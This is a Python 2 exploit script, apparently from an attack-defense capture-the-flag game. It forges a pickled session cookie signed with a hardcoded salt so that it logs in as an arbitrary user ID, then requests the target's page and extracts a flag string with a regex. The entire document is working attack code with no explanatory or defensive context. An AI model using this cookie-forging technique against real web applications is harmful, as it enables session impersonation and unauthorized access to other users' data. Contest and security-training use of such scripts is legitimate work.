#!/usr/bin/env python
# -*- coding: utf-8 -*- 

import requests
import re
import sys
import random
import string
import pickle
import sha

_SALT_ = 'f72f460da5376c477543ae78533892b5'

def exploit(ip, port, flag_id):
    # craft a fake cookie
    session = pickle.dumps({'login': flag_id, 'name': flag_id})
    checksum = sha.new(session + _SALT_).hexdigest()
    session = session.encode('hex')
    cookie = checksum + session

    # Get the flag
    response = requests.get('http://%s:%d/' % (ip, int(port)),
            cookies={'session': cookie}
            )
    if response.status_code == requests.codes.ok:
        m = re.search(r'<p[^>]*>\s*(FLG.{13})\s*</p>', response.text)
        if m:
            return m.group(1)
        else:
            raise Exception('Flag not found')
    else:
        raise Exception('Error on page index')


if __name__ == '__main__':
    print exploit(*sys.argv[1:])

